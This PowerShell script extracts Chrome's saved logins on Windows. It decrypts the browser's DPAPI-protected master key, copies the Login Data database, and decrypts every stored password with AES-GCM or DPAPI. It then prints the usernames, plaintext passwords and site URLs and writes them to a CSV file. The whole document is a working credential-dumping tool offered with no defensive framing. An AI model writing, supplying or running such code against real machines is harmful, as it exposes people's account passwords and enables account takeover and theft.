# Check if the CSV file name is provided as a command-line argument
if ($args.Count -eq 0) {
    Write-Host "Usage: PowerShell.exe -File script.ps1 <output.csv>"
    exit
}

# Assign the first command-line argument to the output file variable
$outputFile = $args[0]

# Install and import the PSSQLite module (if not already installed)
if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
    Install-Module -Name PSSQLite -Force -Scope CurrentUser
}
Import-Module PSSQLite

# Function to get and decrypt the master key from the Local State file
function Get-MasterKey {
    param (
        [string]$localStatePath
    )

    $localStateInfo = Get-Content -Raw $localStatePath | ConvertFrom-Json
    if ($localStateInfo) {
        $encryptedKey = [Convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key)
        if ($encryptedKey -and [string]::new($encryptedKey[0..4]) -eq 'DPAPI') {
            return [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey[5..$encryptedKey.Length], $null, 'CurrentUser')
        }
    }

    throw "Master key not found or could not be decrypted."
}

# Function to decrypt passwords using AES-GCM
function Decrypt-Password {
    param (
        [byte[]]$encryptedPassword,
        [byte[]]$masterKey
    )

    # Ensure the encryptedPassword has the expected structure
    if ($encryptedPassword.Length -lt 31) {
        return $null # Return null if the password data is too short
    }

    try {
        # Create the AESGCM object using the master key
        $gcmKey = [System.Security.Cryptography.AesGcm]::new($masterKey)

        # Extract IV (12 bytes), Cipher text, and Tag (16 bytes) from the encrypted password
        $iv = $encryptedPassword[3..14]
        $cipherText = $encryptedPassword[15..($encryptedPassword.Length - 17)]
        $authTag = $encryptedPassword[-16..-1]

        # Prepare the buffer to hold the decrypted password
        [byte[]]$output = New-Object byte[] ($cipherText.Length)

        # Perform the decryption using AES-GCM
        $gcmKey.Decrypt($iv, $cipherText, $authTag, $output, $null)

        # Return the decrypted password as a string
        return [string]::new($output)
    } catch {
        # Return null in case of failure
        return $null
    }
}

# Function to retrieve data from the SQLite database using PSSQLite
function Get-SQLiteData {
    param (
        [string]$dbPath,
        [string]$tableName
    )

    try {
        $query = "SELECT * FROM $tableName"
        
        # Using the PSSQLite module to query the SQLite database
        $dataSet = Invoke-SqliteQuery -DataSource $dbPath -Query $query
        return $dataSet
    } catch {
        Write-Error "Failed to retrieve data from the SQLite database: $_"
        throw $_
    }
}

# Main script to extract and decrypt Chrome saved credentials
$chromeLocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$chromeLoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Get master key
$masterKey = Get-MasterKey -localStatePath $chromeLocalStatePath

# Copy the SQLite file to a temp location to avoid file locks
$tempLoginDataPath = "$env:TEMP\LoginData.sqlite"
Copy-Item -Path $chromeLoginDataPath -Destination $tempLoginDataPath -Force

# Get login data from SQLite
$loginsTable = Get-SQLiteData -dbPath $tempLoginDataPath -tableName "logins"

# Initialize an array to store the output
$results = @()

# Loop through each row to decrypt and store credentials
foreach ($row in $loginsTable) {
    $username = $row.username_value
    $encryptedPassword = [byte[]]$row.password_value

    # Initialize password variable
    $password = $null

    # Decrypt password if it starts with V10 (AES-GCM encrypted)
    if ([string]::new($encryptedPassword[0..2]) -eq 'V10') {
        $password = Decrypt-Password -encryptedPassword $encryptedPassword -masterKey $masterKey
    } else {
        # Use the old DPAPI decryption method for legacy passwords
        try {
            $password = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPassword, $null, 'CurrentUser')
        } catch {
            # If DPAPI decryption fails, set password to null
            $password = $null
        }
    }

    # Store the output if the password was successfully decrypted
    if ($password) {
        $results += [PSCustomObject]@{
            Username = $username
            Password = $password
            URL      = $row.origin_url
        }
    }
}

# Print the results in a table format
if ($results.Count -gt 0) {
    $results | Format-Table -AutoSize
    # Export results to CSV
    $results | Export-Csv -Path $outputFile -NoTypeInformation -Encoding UTF8
    Write-Host "Credentials saved to $outputFile"
} else {
    Write-Host "No credentials found or decrypted successfully."
}

# Clean up temporary files
Remove-Item -Path $tempLoginDataPath -Force
